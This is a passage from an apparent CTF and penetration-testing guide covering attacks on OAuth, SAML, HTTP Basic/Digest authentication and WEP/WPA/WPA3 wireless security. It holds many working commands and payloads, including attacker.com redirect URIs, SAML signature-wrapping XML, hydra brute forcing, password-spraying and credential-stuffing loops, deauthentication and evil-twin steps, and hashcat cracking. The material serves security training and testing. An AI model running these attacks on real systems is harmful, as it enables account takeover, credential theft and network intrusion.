GET /authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI&scope=openid%20profile&state=RANDOM_STATE

# Token exchange
POST /token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTH_CODE&redirect_uri=REDIRECT_URI&client_id=CLIENT_ID&client_secret=CLIENT_SECRET
```

**Key Vulnerabilities:**

**Redirect URI Manipulation:**

```bash
# Open redirect exploitation
https://oauth-server.com/authorize?client_id=CLIENT&redirect_uri=https://attacker.com

# Path traversal attempts
redirect_uri=https://legitimate.com/../attacker.com
redirect_uri=https://legitimate.com%2f%2fattacker.com

# Subdomain takeover
redirect_uri=https://vulnerable-subdomain.legitimate.com
```

**CSRF on OAuth Flow:**

```html
<!-- Attacker-controlled page forces victim to authorize attacker's OAuth request -->
<img src="https://oauth-server.com/authorize?client_id=CLIENT&redirect_uri=ATTACKER_REDIRECT&state=ATTACKER_STATE">
```

**Testing with Burp Suite:**

```
1. Intercept OAuth authorization request
2. Modify redirect_uri parameter
3. Test for:
   - Open redirect
   - Partial URL matching bypass (redirect_uri=https://legitimate.com@attacker.com)
   - URL parameter injection
4. Analyze state parameter for CSRF protection
```

**Client Secret Exposure:**

```bash
# Search JavaScript files for secrets
curl -s https://target.com/app.js | grep -iE "(client_secret|api_key|bearer)"

# Check mobile app decompilation
apktool d app.apk
grep -r "client_secret" app/

# Git repository leaks
trufflehog --regex --entropy=True https://github.com/target/repo
```

**Token Manipulation:**

```bash
# JWT token analysis (common in OAuth/OIDC)
# Decode JWT
echo "eyJhbGc..." | base64 -d

# Test for algorithm confusion (RS256 to HS256)
# Modify header: "alg": "none" or "alg": "HS256"

# Using jwt_tool
jwt_tool TOKEN -T

# Crack weak secrets
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

**Implicit Flow Exploitation** (deprecated but still found):

```http
# Token returned in URL fragment
GET /authorize?response_type=token&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI
# Access token exposed in browser history and referrer headers
```

**Scope Manipulation:**

```bash
# Request excessive scopes
scope=openid%20profile%20email%20admin%20delete_users

# Scope upgrade attacks - request token with limited scope, then attempt privileged actions
```

**Token Endpoint Testing:**

```bash
# Missing client authentication
curl -X POST https://oauth-server.com/token \
  -d "grant_type=authorization_code&code=CODE&redirect_uri=URI"

# Client credential stuffing
ffuf -w client_ids.txt -w client_secrets.txt:SECRETS -X POST \
  -d "grant_type=client_credentials&client_id=FUZZ&client_secret=SECRETS" \
  -u https://target.com/token

# Authorization code reuse
# Replay intercepted authorization code multiple times
```

**OpenID Connect Specific:**

```bash
# Enumerate discovery endpoint
curl https://oauth-server.com/.well-known/openid-configuration

# Analyze supported features:
# - response_types_supported
# - grant_types_supported  
# - token_endpoint_auth_methods_supported

# ID Token validation bypass
# Modify 'iss' (issuer), 'aud' (audience), or 'sub' (subject) claims
```

**Tools:**

- **Burp Suite Extensions**: OAuth/OIDC Scanner, JWT Editor
- **jwt_tool**: JWT manipulation and testing
- **oauth2-proxy**: Local OAuth testing
- **Postman/cURL**: Manual token flow testing

---

### SAML

Security Assertion Markup Language (SAML) enables Single Sign-On (SSO) through XML-based authentication assertions. Common in enterprise CTF scenarios involving SSO bypass and privilege escalation.

**SAML Flow Components:**

- **Identity Provider (IdP)**: Authenticates users and issues assertions
- **Service Provider (SP)**: Consumes assertions and grants access
- **Assertion**: XML document containing authentication statements

**Core Attack Vectors:**

**XML Signature Wrapping (XSW)** - Manipulating signed SAML responses:

[Unverified] The following XSW payloads are based on documented attack patterns, but success depends on specific parser implementations:

```xml
<!-- Original signed assertion -->
<samlp:Response>
  <saml:Assertion ID="original" >
    <ds:Signature>...</ds:Signature>
    <saml:Subject>
      <saml:NameID>victim@corp.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>

<!-- XSW Attack - Insert unsigned assertion before signed one -->
<samlp:Response>
  <saml:Assertion ID="injected">
    <saml:Subject>
      <saml:NameID>admin@corp.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="original">
    <ds:Signature>...</ds:Signature>
    <saml:Subject>
      <saml:NameID>victim@corp.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**Testing XSW with Tools:**

```bash
# Using SAML Raider (Burp Suite extension)
1. Intercept SAML Response
2. Send to SAML Raider
3. Select XSW attack vector (8 variants exist)
4. Apply and forward

# Manual testing with xmlsec1
xmlsec1 --verify --id-attr:ID saml:Assertion response.xml
```

**Comment Injection:**

```xml
<!-- Insert comments to break signature validation -->
<saml:NameID>victim<!--admin-->@corp.com</saml:NameID>
<!-- Parser may read "admin@corp.com" while signature covers "victim@corp.com" -->
```

**Signature Exclusion:**

```xml
<!-- Remove signature element entirely if validation is optional -->
<saml:Assertion ID="test">
  <!-- <ds:Signature>...</ds:Signature> REMOVED -->
  <saml:Subject>
    <saml:NameID>admin@corp.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>
```

**Certificate Manipulation:**

```bash
# Generate self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# Replace certificate in SAML response
# If SP doesn't validate certificate trust chain, arbitrary signatures may be accepted

# Extract public key from legitimate certificate
openssl x509 -in idp_cert.pem -pubkey -noout > pubkey.pem

# Test if SP accepts arbitrary certificates
```

**Assertion Replay Attacks:**

```bash
# Capture valid SAML assertion
# Check for:
# - Missing NotOnOrAfter timestamp
# - Weak NotBefore validation
# - No assertion ID tracking (prevents replay)

# Replay captured assertion
curl -X POST https://sp.com/acs \
  -d "SAMLResponse=BASE64_ENCODED_ASSERTION"

# Test time window manipulation
# Modify NotBefore/NotOnOrAfter values if not signed
```

**Analyzing SAML Traffic:**

```bash
# Decode Base64 SAML Response
echo "PD94bWwgdmV..." | base64 -d | xmllint --format -

# Key elements to examine:
# - Signature validation scope (what's actually signed?)
# - Assertion ID and timestamps
# - Subject/NameID for identity
# - Attributes (roles, groups, permissions)
# - Audience restrictions
# - Conditions and validity periods

# Encode modified SAML
cat modified.xml | gzip | base64 -w 0
```

**Tool-Assisted SAML Testing:**

```bash
# SAML Raider (Burp Extension) features:
# - XSW attack variants
# - Signature removal
# - Certificate manipulation
# - Timestamp editing

# Manual Burp testing:
1. Intercept SAML Response at /acs endpoint
2. Base64 decode SAMLResponse parameter
3. Inflate if gzip-compressed
4. Modify XML
5. Re-encode and forward
```

**Common Misconfigurations:**

- No signature validation on assertions
- Accepting unsigned assertions
- Weak certificate validation
- Missing replay protection (InResponseTo, NotBefore/NotOnOrAfter)
- Improper XML canonicalization
- Trusting client-provided metadata

**Attribute Manipulation:**

```xml
<!-- If attributes aren't in signed portion -->
<saml:AttributeStatement>
  <saml:Attribute Name="role">
    <saml:AttributeValue>admin</saml:AttributeValue>
  </saml:Attribute>
  <saml:Attribute Name="groups">
    <saml:AttributeValue>administrators</saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

**Tools:**

- **SAML Raider**: Burp Suite extension for SAML testing
- **xmlsec1**: Command-line XML signature verification
- **SAMLtest.id**: Online SAML validator
- **Burp Suite**: Manual interception and modification

---

### HTTP Basic/Digest Auth

Legacy authentication mechanisms still found in APIs, embedded devices, and internal systems. Common in CTF infrastructure and IoT challenges.

**HTTP Basic Authentication:**

**Mechanism:**

- Credentials sent as Base64-encoded `username:password` in Authorization header
- **Not encrypted** - trivially decoded without TLS

```http
GET /resource HTTP/1.1
Host: target.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```

**Decoding:**

```bash
# Decode Base64
echo "dXNlcm5hbWU6cGFzc3dvcmQ=" | base64 -d
# Output: username:password

# Encode credentials
echo -n "admin:password123" | base64
# Output: YWRtaW46cGFzc3dvcmQxMjM=
```

**Brute Force Attacks:**

```bash
# Hydra
hydra -L users.txt -P passwords.txt target.com http-get /admin

# With specific path
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-get /api/endpoint

# Against HTTPS
hydra -l admin -P passwords.txt -s 443 target.com https-get /protected

# Medusa
medusa -h target.com -U users.txt -P passwords.txt -M http -m DIR:/admin

# Nmap NSE script
nmap -p 80 --script http-brute --script-args http-brute.path=/admin target.com

# Custom with ffuf (faster for wordlists)
ffuf -w users.txt:USER -w passwords.txt:PASS \
  -H "Authorization: Basic $(echo -n USER:PASS | base64)" \
  -u https://target.com/admin -mc 200
```

**Password Spraying:**

```bash
# Test single password against multiple users
for user in $(cat users.txt); do
  curl -u "$user:Password123" https://target.com/api
done

# With rate limiting delay
while IFS= read -r user; do
  curl -u "$user:Spring2024" https://target.com/api
  sleep 2
done < users.txt
```

**Credential Stuffing:**

```bash
# Using credential pairs (breach data format: user:pass)
while IFS=: read -r user pass; do
  response=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" https://target.com/api)
  if [ "$response" = "200" ]; then
    echo "Valid: $user:$pass"
  fi
done < credentials.txt
```

**HTTP Digest Authentication:**

**Mechanism:**

- Challenge-response using MD5 hashing
- Server sends nonce, client responds with hashed credentials
- More secure than Basic but still vulnerable to attacks

**Challenge Example:**

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Digest realm="Protected", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", qop="auth"
```

**Response Structure:**

```http
Authorization: Digest username="admin",
  realm="Protected",
  nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",
  uri="/resource",
  qop=auth,
  nc=00000001,
  cnonce="0a4f113b",
  response="6629fae49393a05397450978507c4ef1",
  opaque="5ccc069c403ebaf9f0171e9517f40e41"
```

**Hash Calculation:**

```bash
# HA1 = MD5(username:realm:password)
# HA2 = MD5(method:uri)
# Response = MD5(HA1:nonce:nc:cnonce:qop:HA2)

# Manual calculation
echo -n "admin:Protected:password" | md5sum
echo -n "GET:/resource" | md5sum
# Combine according to formula
```

**Digest Authentication Attacks:**

**Brute Force:**

```bash
# Hydra with Digest
hydra -l admin -P passwords.txt target.com http-get-digest /protected

# Custom script capturing challenge
curl -I http://target.com/protected  # Get nonce
# Calculate response hash for each password attempt
```

**Nonce Analysis:**

```bash
# Check if nonce is static (replay attack possible)
curl -I http://target.com/protected  # Request 1
curl -I http://target.com/protected  # Request 2
# Compare nonce values

# Check nonce expiration
# Reuse old response hash with captured nonce
```

**QOP Downgrade:**

```bash
# If qop not enforced, simplify hash calculation
# Remove nc (nonce count) and cnonce from calculation

# Test response without qop:
# Response = MD5(HA1:nonce:HA2)
```

**Offline Cracking (if hash captured):**

```bash
# Extract Digest auth traffic from pcap
tshark -r capture.pcap -Y "http.authorization" -T fields -e http.authorization

# Format for hashcat (mode 11400 - HTTP Digest)
# Format: username:realm:nonce:uri:nc:cnonce:qop:response
hashcat -m 11400 digest_hash.txt /usr/share/wordlists/rockyou.txt
```

**Common Vulnerabilities in Both:**

**Missing TLS:**

```bash
# Sniff credentials over HTTP
tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -i authorization

# Wireshark filter
http.authorization
```

**Default Credentials:**

```bash
# Common defaults to test:
admin:admin
admin:password
root:root
administrator:administrator

# Device-specific (routers, IoT):
admin:1234
admin:admin1234
admin:(blank)
```

**Path-Based Bypass:**

```bash
# Test authentication scope
curl http://target.com/admin/  # Requires auth
curl http://target.com/admin   # Trailing slash bypass?
curl http://target.com/./admin  # Path traversal
curl http://target.com/admin/./  # Normalization bypass
curl http://target.com/admin%2f  # URL encoding
curl http://target.com/admin/../admin  # Redundant path
```

**Verb Tampering:**

```bash
# Try different HTTP methods
curl -X GET http://admin:pass@target.com/protected
curl -X POST http://admin:pass@target.com/protected
curl -X PUT http://admin:pass@target.com/protected
curl -X DELETE http://admin:pass@target.com/protected
curl -X OPTIONS http://admin:pass@target.com/protected
curl -X TRACE http://admin:pass@target.com/protected
```

**Header Injection:**

```bash
# Test for inconsistent parsing
curl -H "Authorization: Basic YWRtaW46cGFzcw==" -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin

# Multiple Authorization headers
curl -H "Authorization: Basic invalid" -H "Authorization: Basic valid" http://target.com/admin
```

**Enumeration:**

```bash
# Timing-based username enumeration
# Valid users may have different response times
time curl -u "validuser:wrongpass" http://target.com/api
time curl -u "invaliduser:wrongpass" http://target.com/api

# Response code differences
# 401 vs 403 may leak username validity
```

**Tools:**

- **Hydra**: Multi-protocol brute forcing (http-get, http-get-digest)
- **Medusa**: Alternative brute forcer
- **Burp Suite Intruder**: Custom attack positions
- **ffuf**: Fast web fuzzer for credential testing
- **Patator**: Modular brute forcer with flexible options
- **Nmap NSE**: http-brute, http-default-accounts scripts

**[Inference]** In CTF scenarios, HTTP Basic/Digest auth challenges often involve:

- Weak credentials on hidden admin panels
- Default credentials on simulated IoT devices
- Traffic captures containing Base64-encoded credentials
- Authentication bypass through path normalization
- Offline hash cracking from pcap files

---

**Important Related Subtopics:**

- **Kerberos Delegation Attacks** (Constrained, Unconstrained, Resource-Based)
- **OAuth Device Code Flow** exploitation
- **JWT Algorithm Confusion** attacks
- **SAML Metadata Manipulation**
- **NTLM Relay** attacks in hybrid Kerberos/NTLM environments

---

## Wireless Security

### WEP (Wired Equivalent Privacy) - Broken

WEP is a deprecated wireless security protocol from 1997 that uses RC4 stream cipher encryption. It is fundamentally broken due to cryptographic weaknesses in its implementation.

**Critical Vulnerabilities:**

- **IV Reuse**: WEP uses a 24-bit Initialization Vector (IV), creating only 16,777,216 possible values. On busy networks, IV collisions occur within hours, allowing keystream reuse attacks
- **Weak Key Scheduling**: Certain IVs (weak IVs) leak information about the key through statistical analysis
- **No Replay Protection**: Packets can be captured and retransmitted without detection
- **CRC-32 Integrity**: Uses CRC-32 for integrity checking, which is linear and doesn't provide cryptographic authentication

**Attack Methodology:**

**Passive Cracking (Data Collection):**

```bash
# Put wireless interface into monitor mode
airmon-ng start wlan0

# Identify target network
airodump-ng wlan0mon

# Capture WEP traffic on specific channel
airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon
```

Wait to collect 40,000-85,000 IVs for 64-bit WEP or 200,000+ IVs for 128-bit WEP, then crack:

```bash
aircrack-ng capture-01.cap
```

**Active Attack (ARP Replay):**

```bash
# Fake authentication to AP
aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <YOUR_MAC> wlan0mon

# Capture ARP request
aireplay-ng -3 -b <AP_MAC> -h <YOUR_MAC> wlan0mon

# Deauthenticate client to force ARP (optional)
aireplay-ng -0 1 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
```

This generates thousands of IVs per minute, reducing crack time to 1-5 minutes.

**ChopChop Attack (Unknown Key):**

```bash
# Decrypts one byte at a time without knowing the key
aireplay-ng -4 -b <AP_MAC> -h <YOUR_MAC> wlan0mon
```

**Fragmentation Attack:**

```bash
# Obtains PRGA (Pseudo-Random Generation Algorithm) output
aireplay-ng -5 -b <AP_MAC> -h <YOUR_MAC> wlan0mon

# Create ARP packet with obtained PRGA
packetforge-ng -0 -a <AP_MAC> -h <YOUR_MAC> -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp-packet
```

**Tools:**

- `aircrack-ng` - Primary WEP cracking suite
- `besside-ng` - Automated WEP cracking
- `weplab` - WEP key recovery tool
- `wesside-ng` - Automatic WEP cracker without client

WEP can typically be cracked in under 10 minutes on modern hardware. Networks still using WEP should be considered completely compromised.

---

### WPA/WPA2

WPA (Wi-Fi Protected Access) and WPA2 are security protocols that replaced WEP. WPA2 uses AES-CCMP encryption and is significantly more secure than WEP.

**Architecture:**

- **Authentication**: WPA-Personal (PSK) or WPA-Enterprise (802.1X)
- **Encryption**:
    - WPA: TKIP (Temporal Key Integrity Protocol)
    - WPA2: AES-CCMP (Counter Mode with CBC-MAC Protocol)
- **Integrity**: Michael (WPA) or CBC-MAC (WPA2)

**WPA2-PSK Attack Vectors:**

**4-Way Handshake Capture:**

```bash
# Monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture on target channel
airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon

# Deauth client to capture handshake
aireplay-ng -0 2 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
```

Look for "WPA handshake: \<BSSID>" in airodump-ng output.

**Dictionary Attack:**

```bash
# Basic dictionary attack
aircrack-ng -w wordlist.txt -b <AP_MAC> capture-01.cap

# Using hashcat (faster, GPU-accelerated)
# Convert to hashcat format
hccapx capture-01.cap capture.hccapx

# Hashcat mode 2500 (WPA/WPA2)
hashcat -m 2500 -a 0 capture.hccapx wordlist.txt

# Hashcat mode 22000 (newer format)
hcxpcapngtool -o capture.22000 capture-01.cap
hashcat -m 22000 -a 0 capture.22000 wordlist.txt
```

**Rule-Based Attack:**

```bash
# Apply rules to wordlist
hashcat -m 22000 -a 0 capture.22000 wordlist.txt -r rules/best64.rule

# Combination attack
hashcat -m 22000 -a 1 capture.22000 wordlist1.txt wordlist2.txt

# Mask attack (brute-force with pattern)
hashcat -m 22000 -a 3 capture.22000 ?d?d?d?d?d?d?d?d
```

**PMKID Attack (Clientless):**

[Unverified - effectiveness varies by router firmware]

Some routers transmit the PMKID (Pairwise Master Key Identifier) in the first EAPOL frame, allowing cracking without capturing a full handshake or deauthenticating clients:

```bash
# Capture PMKID
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o capture.22000 capture.pcapng

# Crack PMKID
hashcat -m 22000 -a 0 capture.22000 wordlist.txt
```

**WPA-Enterprise Attacks:**

**Evil Twin / Rogue AP:**

```bash
# Create fake AP with hostapd-wpe (WPE = Wireless Pwnage Edition)
hostapd-wpe hostapd-wpe.conf

# Captures MSCHAP authentication attempts
# Check /var/log/hostapd-wpe.log for hashes

# Crack captured hashes
asleap -C <challenge> -R <response> -W wordlist.txt
```

**EAP Method Downgrade:** Set up rogue AP that forces weaker EAP methods (EAP-MD5, EAP-GTC) which can leak credentials.

**KRACK (Key Reinstallation Attack):**

[CVE-2017-13077 through CVE-2017-13088]

Exploits the 4-way handshake by forcing nonce reuse, allowing packet decryption and injection. Most systems are now patched.

```bash
# KRACK attack script (proof-of-concept)
# Note: Requires vulnerable client
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts
./krack-test-client.py
```

**WPA3-Transition Mode Downgrade:**

If AP supports both WPA2 and WPA3, attacker can force downgrade to WPA2 and use standard WPA2 attacks.

**Tools:**

- `aircrack-ng` - WPA/WPA2 cracking suite
- `hashcat` - GPU-accelerated password cracking
- `john` - CPU-based password cracking
- `cowpatty` - WPA-PSK auditing
- `pyrit` - GPU-accelerated WPA/WPA2 cracking
- `hostapd-wpe` - Rogue AP for WPA-Enterprise
- `eaphammer` - Evil twin attacks for WPA-Enterprise
- `wifite` - Automated wireless attack tool
- `bettercap` - Network attack framework

**Common Wordlists:**

- `/usr/share/wordlists/rockyou.txt`
- `/usr/share/wordlists/wpa-dict.txt`
- `crackstation.txt` (15GB, online)
- Custom wordlists with wifi-specific patterns

---

### WPA3

WPA3 is the latest wireless security protocol, ratified in 2018, designed to address WPA2 vulnerabilities. It uses Simultaneous Authentication of Equals (SAE) instead of the 4-way handshake for PSK authentication.

**Key Improvements:**

- **SAE (Dragonfly)**: Replaces PSK 4-way handshake, provides forward secrecy and resistance to offline dictionary attacks
- **Protected Management Frames (PMF)**: Mandatory, prevents deauthentication and disassociation attacks
- **Individualized Data Encryption**: 192-bit security suite for enterprise
- **Opportunistic Wireless Encryption (OWE)**: Encryption for open networks

**Attack Vectors:**

**Dragonfly Handshake Downgrade:**

Some implementations allow fallback to WPA2 if client doesn't support WPA3:

```bash
# Scan for WPA3-Transition networks
airodump-ng wlan0mon

# Look for networks with "WPA2 WPA3" in encryption field
# Force downgrade by blocking WPA3 frames or using WPA2-only client
```

**Side-Channel Attacks on Dragonfly:**

[CVE-2019-9494, CVE-2019-9495 - Dragonblood vulnerabilities]

Timing and cache-based side-channel attacks can leak password information during SAE handshake. These attacks are complex and environment-dependent.

[Inference - requires precise timing measurements and multiple authentication attempts]

```bash
# Dragonblood attack toolkit (research/PoC)
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Timing attack to determine password length/characters
# Requires proximity and multiple authentication attempts
```

**Denial of Service:**

While PMF prevents traditional deauth attacks, resource exhaustion attacks against SAE are possible:

```bash
# SAE commit flood
# Forces AP to perform expensive cryptographic operations
# [Unverified - effectiveness varies by AP implementation]
```

**Transition Mode Exploitation:**

Networks running "WPA3-Transition" mode accept both WPA2 and WPA3 clients:

```bash
# Connect as WPA2 client to WPA3-Transition network
wpa_supplicant -i wlan0 -c wpa2_config.conf

# Once connected via WPA2, standard WPA2 attacks apply
```

**Implementation Vulnerabilities:**

[Inference - based on historical patterns with new protocols]

Early WPA3 implementations may contain bugs. Check vendor security advisories for specific models.

**Tools:**

- `dragonslayer` - Dragonblood attack toolkit
- `hostapd` (development version) - For setting up WPA3 test environments
- `wpa_supplicant` (recent version) - WPA3 client support

**Defense Considerations:**

- WPA3-only mode (disable transition mode) eliminates WPA2 downgrade attacks
- Regular firmware updates patch implementation vulnerabilities
- Strong, unique passwords still critical for SAE

**Current Status:**

[As of January 2025 knowledge cutoff]

WPA3 is still relatively new with ongoing security research. While significantly more secure than WPA2 against offline attacks, implementation vulnerabilities and transition mode weaknesses exist. Pure WPA3 networks without WPA2 fallback are considerably more resistant to common wireless attacks.

---

### 4-Way Handshake

The 4-way handshake is the authentication mechanism used in WPA/WPA2-PSK to establish session keys without transmitting the PSK over the air. Understanding this process is critical for wireless exploitation.

**Purpose:**

- Confirm both parties know the PSK without revealing it
- Establish PTK (Pairwise Transient Key) for unicast encryption
- Establish GTK (Group Temporal Key) for multicast/broadcast encryption
- Provide mutual authentication between client and AP

**Key Hierarchy:**

```
PSK (Pre-Shared Key) - Derived from passphrase via PBKDF2
  └─> PMK (Pairwise Master Key) = PBKDF2(passphrase, SSID, 4096 iterations, 256 bits)
       └─> PTK (Pairwise Transient Key) = PRF(PMK, ANonce, SNonce, AP_MAC, STA_MAC)
            ├─> KCK (Key Confirmation Key) - 128 bits
            ├─> KEK (Key Encryption Key) - 128 bits
            └─> TK (Temporal Key) - 128 bits (data encryption)
```

**The 4 Messages:**

**Message 1 (AP → Client):**

- AP sends ANonce (random number)
- No MIC (Message Integrity Check)
- Client now has: PMK, ANonce, SNonce (client generates), AP_MAC, STA_MAC
- Client can now derive PTK

**Message 2 (Client → AP):**

- Client sends SNonce and MIC
- MIC calculated using KCK portion of PTK
- Includes client's RSN IE (Robust Security Network Information Element)
- AP now has all components to derive PTK
- AP verifies MIC to confirm client knows PSK

**Message 3 (AP → Client):**

- AP sends GTK encrypted with KEK
- Includes MIC
- Contains AP's RSN IE
- May include IGTK (Integrity Group Temporal Key) for management frame protection
- Client verifies MIC

**Message 4 (Client → AP):**

- Client acknowledges receipt of GTK
- Includes MIC
- Handshake complete after AP receives this

**Exploitation During Handshake:**

**Capture Requirements:**

A complete capture needs Messages 2 and 3 (minimum) or all 4 messages:

```bash
# Verify handshake quality
aircrack-ng capture-01.cap

# Look for output:
# "1 handshake" (complete)
# "incomplete" (missing messages)
```

**EAPOL Frame Structure:**

```bash
# Examine captured handshake with tshark
tshark -r capture-01.cap -Y "eapol" -V

# Extract handshake details
tshark -r capture-01.cap -Y "eapol" -T fields \
  -e frame.number \
  -e wlan.sa \
  -e wlan.da \
  -e eapol.keydes.key_info
```

**MIC Verification Process:**

The MIC in Message 2 is what enables offline dictionary attacks:

1. Attacker knows: SSID, AP_MAC, STA_MAC, ANonce, SNonce, MIC
2. For each password guess:
    - PMK = PBKDF2(guess, SSID, 4096)
    - PTK = PRF(PMK, ANonce, SNonce, AP_MAC, STA_MAC)
    - Extract KCK from PTK
    - Calculate MIC' using KCK
    - Compare MIC' with captured MIC

**PBKDF2 Performance:**

The 4096 iterations make brute-forcing slow:

```bash
# Benchmark PBKDF2 performance
hashcat -m 22000 -b

# Typical rates (GPU-dependent):
# NVIDIA RTX 3090: ~1,000,000 H/s
# NVIDIA RTX 4090: ~1,500,000 H/s
# NVIDIA A100: ~2,000,000 H/s
```

**Precomputed PMK Tables:**

Since PMK depends only on passphrase and SSID, PMKs can be precomputed for common SSIDs:

```bash
# Generate PMK rainbow table
genpmk -f wordlist.txt -d pmk_database.db -s "commonSSID"

# Use precomputed PMKs
cowpatty -d pmk_database.db -r capture-01.cap -s "commonSSID"
```

[Inference - storage requirements make comprehensive rainbow tables impractical]

This only works for common SSIDs. Custom SSIDs require full PBKDF2 computation.

**Handshake Manipulation:**

**Forced Reauthentication:**

```bash
# Broadcast deauth (all clients)
aireplay-ng -0 0 -a <AP_MAC> wlan0mon

# Targeted deauth (single client)
aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon

# Continuous deauth until handshake captured
aireplay-ng -0 0 -a <AP_MAC> wlan0mon &
airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon
```

**Disassociation Attack (alternative to deauth):**

```bash
# Disassociate client
aireplay-ng -6 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
```

**KRACK Exploitation:**

The KRACK attack specifically targets the handshake by manipulating Message 3 retransmissions:

1. Block Message 4 from reaching AP
2. AP retransmits Message 3
3. Client reinstalls PTK, resetting nonce
4. Nonce reuse allows decryption and injection

**Handshake Capture Optimization:**

```bash
# Use multiple interfaces for simultaneous capture and deauth
airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon &
aireplay-ng -0 3 -a <AP_MAC> wlan1mon

# Automated tool
wifite --kill --wpa --dict wordlist.txt
```

**Tools for Handshake Analysis:**

- `wireshark` - Detailed protocol analysis
- `tshark` - Command-line packet analysis
- `pyrit` - Advanced PMK management
- `hcxtools` - Handshake capture and conversion utilities

**Common Capture Issues:**

- **Incomplete handshake**: Only some EAPOL frames captured (too far from AP/client)
- **Wrong channel**: Ensure monitoring correct channel
- **No clients**: Cannot force handshake without active client
- **PMF enabled**: Protected Management Frames prevent deauth attacks (WPA3 or WPA2 with PMF)

The 4-way handshake's reliance on offline-crackable MIC verification is its fundamental weakness, making strong passphrases (20+ random characters) essential for WPA2 security.

---

**Related Critical Topics:**

For comprehensive wireless security testing, also study:

- **Wireless Reconnaissance** - OSINT, wardriving, RF spectrum analysis
- **Rogue Access Points** - Evil twin attacks, captive portal phishing
- **Bluetooth/BLE Attacks** - Alternative wireless attack surface
- **802.1X Exploitation** - RADIUS attacks, certificate validation bypasses
- **Client-Side Attacks** - Karma/MANA attacks, hostile network auto-connection

---

## Tools

### sslscan

`sslscan` is a fast SSL/TLS scanner that tests which cipher suites, protocols, and certificate details are supported by a target server.

**Basic syntax:**

```bash
sslscan [options] <host>:<port>
```

**Common commands:**

```bash
# Basic scan on default HTTPS port
sslscan example.com

# Scan specific port
sslscan example.com:8443

# Scan with verbose output
sslscan --verbose example.com

# Show certificate information
sslscan --show-certificate example.com

# Test for specific vulnerabilities
sslscan --no-failed example.com

# Show only supported ciphers (hide failed)
sslscan --no-failed --no-colour example.com

# IPv6 scanning
sslscan --ipv6 example.com

# XML output for parsing
sslscan --xml=output.xml example.com
```

**Key output interpretation:**

- **Protocol versions**: Identifies SSLv2, SSLv3, TLS 1.0, 1.1, 1.2, 1.3 support
- **Cipher suites**: Lists accepted/rejected ciphers with strength ratings
- **Certificate details**: Shows issuer, validity dates, subject alternative names
- **Vulnerabilities**: Flags weak ciphers, deprecated protocols, expired certificates

**CTF applications:**

- Identify weak cipher suites for downgrade attacks
- Detect SSLv2/SSLv3 support (DROWN, POODLE vulnerabilities)
- Extract certificate information for subdomain enumeration
- Identify misconfigured TLS implementations

---

### testssl.sh

`testssl.sh` is a comprehensive command-line tool that performs extensive SSL/TLS testing beyond basic cipher enumeration. It checks for protocol vulnerabilities, implementation flaws, and configuration weaknesses.

**Basic syntax:**

```bash
./testssl.sh [options] <URI or host:port>
```

**Installation:**

```bash
git clone --depth 1 https://github.com/drwetter/testssl.sh.git
cd testssl.sh
./testssl.sh example.com
```

**Common commands:**

```bash
# Full scan (comprehensive)
./testssl.sh example.com

# Scan specific port
./testssl.sh example.com:8443

# Quick scan (essential tests only)
./testssl.sh --fast example.com

# Test specific vulnerabilities
./testssl.sh --heartbleed example.com
./testssl.sh --ccs example.com  # CCS injection
./testssl.sh --ticketbleed example.com
./testssl.sh --robot example.com

# Protocol-specific testing
./testssl.sh --protocols example.com
./testssl.sh --server-defaults example.com

# Cipher suite enumeration
./testssl.sh --ciphers example.com
./testssl.sh --each-cipher example.com  # Test every single cipher

# Certificate analysis
./testssl.sh --server-preference example.com

# Output formats
./testssl.sh --jsonfile results.json example.com
./testssl.sh --htmlfile results.html example.com
./testssl.sh --csvfile results.csv example.com

# Parallel testing (multiple hosts from file)
./testssl.sh --file hosts.txt --parallel

# Specify OpenSSL binary path
./testssl.sh --openssl /usr/local/bin/openssl example.com

# Severity filtering (only show findings of certain severity)
./testssl.sh --severity HIGH example.com
```

**Key vulnerability checks:**

- **Heartbleed** (CVE-2014-0160): OpenSSL memory disclosure
- **CCS Injection** (CVE-2014-0224): ChangeCipherSpec protocol flaw
- **Ticketbleed** (CVE-2016-9244): Session ticket memory leak
- **ROBOT** (CVE-2017-6168 and related): Bleichenbacher oracle attack
- **DROWN** (CVE-2016-0800): SSLv2 cross-protocol attack
- **POODLE** (CVE-2014-3566): SSLv3 padding oracle
- **BEAST** (CVE-2011-3389): TLS 1.0 CBC vulnerability
- **CRIME/BREACH**: Compression-based attacks
- **Renegotiation vulnerabilities**: Client-initiated renegotiation flaws

**CTF applications:**

- Automated vulnerability assessment of SSL/TLS services
